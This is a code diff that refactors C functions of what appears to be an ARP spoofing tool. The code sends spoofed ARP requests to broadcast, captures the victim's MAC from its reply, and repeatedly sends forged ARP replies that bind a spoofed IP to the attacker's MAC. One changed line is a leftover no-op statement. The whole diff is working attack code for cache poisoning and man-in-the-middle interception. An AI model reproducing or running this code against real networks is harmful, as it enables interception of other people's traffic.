@@ -5,16 +5,16 @@ int send_packet_to_brodcast(const int sock, struct sockaddr_ll *device,
                             const char *spoofed_ip_source, const char *victim_ip)
 {
     t_ether_tram ether_tram;
-    t_arp_packet arp_packet;
 
-    if (create_arp_packet(&arp_packet, ARPOP_REQUEST,
+    if (create_arp_packet(&(ether_tram.arp_packet), ARPOP_REQUEST,
                           ETH_BRODCAST, victim_ip,
                           my_mac_address, spoofed_ip_source))
     {
         error("create_arp_packet():");
         return 1;
     }
-    else if (create_ethernet_trame(&ether_tram, ETH_BRODCAST, my_mac_address, &arp_packet))
+    else if (create_ethernet_trame(&ether_tram, ETH_BRODCAST, my_mac_address,
+                                   &(ether_tram.arp_packet)))
     {
         error("create_ethernet_tram():");
         return 1;
@@ -35,7 +35,6 @@ int get_victim_response(const int sock, const char *victim_ip, uint8_t *victim_m
 {
     int rep = 1;
     char buffer[IP_MAXPACKET];
-    t_arp_packet arp_packet;
     t_ether_tram ether_tram;
     char ip_str[INET_ADDRSTRLEN] = {0};
     printf("\t[*] Listening target response\n");
@@ -50,12 +49,12 @@ int get_victim_response(const int sock, const char *victim_ip, uint8_t *victim_m
             memcpy(&ether_tram, buffer, sizeof(t_ether_tram));
             if (ntohs(ether_tram.ether_type) == ETH_P_ARP)
             {
-                arp_packet = ether_tram.arp_packet;
-                if (inet_ntop(AF_INET, arp_packet.sender_ip, ip_str, INET_ADDRSTRLEN) < 0)
+                ether_tram.arp_packet;
+                if (inet_ntop(AF_INET, ether_tram.arp_packet.sender_ip, ip_str, INET_ADDRSTRLEN) < 0)
                     error("inet_ntop():");
-                else if (ntohs(arp_packet.operation) == ARPOP_REPLY && strcmp(ip_str, victim_ip) == 0)
+                else if (ntohs(ether_tram.arp_packet.operation) == ARPOP_REPLY && strcmp(ip_str, victim_ip) == 0)
                 {
-                    memcpy(victim_mac_address, arp_packet.sender_mac, ETH_ADD_L * sizeof(uint8_t));
+                    memcpy(victim_mac_address, ether_tram.arp_packet.sender_mac, ETH_ADD_L * sizeof(uint8_t));
                     rep = 0;
                 }
             }
@@ -64,13 +63,13 @@ int get_victim_response(const int sock, const char *victim_ip, uint8_t *victim_m
 
     printf("[+] Got response from victim\n");
     printf("\t[*] Sender MAC adress: ");
-    PRINT_MAC_ADDRESS(arp_packet.sender_mac);
+    PRINT_MAC_ADDRESS(ether_tram.arp_packet.sender_mac);
     printf("\t[*] Sender ip address: ");
-    PRINT_IP_ADDRESS(arp_packet.sender_ip);
+    PRINT_IP_ADDRESS(ether_tram.arp_packet.sender_ip);
     printf("\t[*] Target mac address: ");
-    PRINT_MAC_ADDRESS(arp_packet.target_mac);
+    PRINT_MAC_ADDRESS(ether_tram.arp_packet.target_mac);
     printf("\t[*] Target ip address: ");
-    PRINT_IP_ADDRESS(arp_packet.target_ip);
+    PRINT_IP_ADDRESS(ether_tram.arp_packet.target_ip);
 
     printf("[+] victime mac adress : ");
     PRINT_MAC_ADDRESS(victim_mac_address);
@@ -90,16 +89,15 @@ int repeated_sending(int sock, struct sockaddr_ll *device,
                      const uint8_t *victim_mac_adres, const char *victim_ip)
 {
     t_ether_tram ether_tram;
-    t_arp_packet arp_packet;
 
-    if (create_arp_packet(&arp_packet, ARPOP_REPLY,
+    if (create_arp_packet(&(ether_tram.arp_packet), ARPOP_REPLY,
                           victim_mac_adres, victim_ip,
                           my_mac_address, spoofed_ip))
     {
         error("create_arp_packet():");
         return 1;
     }
-    else if (create_ethernet_trame(&ether_tram, victim_mac_adres, my_mac_address, &arp_packet))
+    else if (create_ethernet_trame(&ether_tram, victim_mac_adres, my_mac_address, &(ether_tram.arp_packet)))
     {
         error("create_ethernet_tram():");
         return 1;
